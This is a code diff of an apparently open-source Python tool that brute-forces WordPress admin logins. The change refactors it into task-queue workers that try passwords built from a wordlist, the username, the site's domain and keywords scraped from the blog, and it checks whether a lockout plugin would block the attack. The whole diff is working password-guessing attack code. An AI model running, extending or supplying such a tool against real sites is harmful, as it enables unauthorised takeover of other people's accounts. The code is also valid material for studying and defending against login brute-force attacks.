@@ -21,26 +21,22 @@ import logging, logging.config
 import urllib2, urlparse
 import sys, threading, Queue, time, argparse
 
-import config, wplib
+import config, wplib, wptask
 
-class WpbfThread(threading.Thread):
-    """Handle threads that consume the wordlist queue and try to login for each word"""
-    def __init__(self, wordlist_queue):
+class WpbfWorker(threading.Thread):
+    """Handle threads that consume the tasks queue"""
+    def __init__(self, task_queue):
         threading.Thread.__init__(self)
-        self._queue = wordlist_queue
+        self._queue = task_queue
 
     def run(self):
         while self._queue.qsize() > 0:
             try:
-                word = self._queue.get()
-                if wp.login(config.username, word):
-                    logger.info("Password '%s' found for username '%s' on %s", word, config.username, wp.get_login_url())
-                    self._queue.queue.clear()
+                task = self._queue.get()
+                task.run()
                 self._queue.task_done()
-            except urllib2.HTTPError, e:
-                logger.debug("HTTP Error: %s for: %s", str(e), word)
-                self._queue.put(word)
-                logger.debug("Requeued: %s", word)
+            except wptask.WpTaskStop:
+                self._queue.queue.clear()
 
 if __name__ == '__main__':
     #parse command line arguments
@@ -94,7 +90,7 @@ if __name__ == '__main__':
         exit(0)
 
     # queue
-    queue = Queue.Queue()
+    task_queue = Queue.Queue()
 
     # check URL and username
     logger.info("Checking URL & username...")
@@ -127,50 +123,53 @@ if __name__ == '__main__':
             logger.info("Check if proxy is well configured and running")
         sys.exit(0)
 
+    # load fingerprint task into queue
+    if args.nofingerprint:
+        task_queue.put(wptask.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))
+
     # check for Login LockDown plugin
     logger.debug("Checking for Login LockDown plugin")
     if wp.check_loginlockdown():
         logger.warning("Login LockDown plugin is active, bruteforce will be useless")
         sys.exit(0)
 
-    # load username into queue
-    if config.username not in queue.queue:
-        queue.put(config.username)
-
     # load wordlist into queue
+    wordlist = [config.username]    # add username to the wordlist
     logger.debug("Loading wordlist...")
     try:
-        [queue.put(w.strip()) for w in open(config.wordlist, "r").readlines()]
+        [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
     except IOError:
         logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
-    logger.debug("%s words loaded from %s", str(queue.qsize()), config.wordlist)
+    logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
 
     # load into queue additional keywords from blog main page
     if args.nokeywords:
-        logger.info("Load into queue additional words using keywords from blog...")
-        queue.put(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
-        [queue.put(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
+        logger.info("Loading additional keywords from blog to the wordlist...")
+        wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
+        [wordlist.append(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
 
-    # wordpress version
-    if args.nofingerprint:
-        if wp.fingerprint():
-            logger.info("WordPress version: %s", wp.get_version())
+    # load logins into task queue
+    for password in wordlist:
+        login_task = wptask.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy)
+        login_task.setUsername(config.username)
+        login_task.setPassword(password)
+        task_queue.put(login_task)
 
-    # spawn threads
-    logger.info("Bruteforcing...")
+    # start workers
+    logger.info("Starting workers...")
     for i in range(config.threads):
-        t = WpbfThread(queue)
+        t = WpbfWorker(task_queue)
         t.start()
 
     # feedback to stdout
-    while queue.qsize() > 0:
+    while task_queue.qsize() > 0:
         try:
             # poor ETA implementation
             start_time = time.time()
-            start_queue = queue.qsize()
+            start_queue = task_queue.qsize()
             time.sleep(10)
             delta_time = time.time() - start_time
-            current_queue = queue.qsize()
+            current_queue = task_queue.qsize()
             delta_queue = start_queue - current_queue
             try:
                 wps = delta_time / delta_queue
@@ -179,6 +178,6 @@ if __name__ == '__main__':
             print str(current_queue)+" words left / "+str(round(1 / wps, 2))+" passwords per second / "+str( round((wps*current_queue / 60)/60, 2) )+"h left"
         except KeyboardInterrupt:
             logger.info("Clearing queue and killing threads...")
-            queue.queue.clear()
+            task_queue.queue.clear()
             for t in threading.enumerate()[1:]:
                 t.join()
